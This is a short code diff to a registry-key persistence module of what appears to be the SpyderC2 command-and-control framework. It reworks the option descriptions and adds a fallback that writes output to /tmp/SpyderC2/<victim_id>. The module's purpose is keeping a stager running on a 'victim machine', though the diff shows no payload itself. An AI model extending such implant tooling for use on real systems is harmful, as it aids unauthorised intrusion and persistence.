@@ -17,8 +17,8 @@ class Registrykey(Module):
 	@classmethod
 	def module_options(cls):
 		h = {
-			'name' : 'Name of the registry key.',
-			'value' : 'Value of the registry key, it should point to where the stager is present on victim machine. By default it takes the correct path'
+			'name' : {'desc': 'Name of the registry key.','required': False},
+			'value' : {'desc':'Value of the registry key, it should point to where the stager is present on victim machine. By default it takes the correct path','required': False}
 		}
 		return h
 
@@ -47,6 +47,15 @@ class Registrykey(Module):
 				print(f"Provided save path does not exists - {options['path']}. Saving to default directory {ss_path}")
 			else:
 				file_path = os.path.join(options['path'],filename)
+
+
+		## Check if we have write perms else save to /tmp/SpyderC2
+		if not os.access(os.path.dirname(file_path), os.W_OK):
+			dump_path = os.path.join('/tmp','SpyderC2',victim_id)
+			print(f"No write access to {os.path.dirname(file_path)}. Saving to {dump_path}")
+			if not os.path.exists(dump_path):
+				os.makedirs(dump_path,exist_ok=True)
+			file_path = os.path.join(dump_path,filename)
 
 		f = open(file_path,'w+')
 		print(output,file=f)
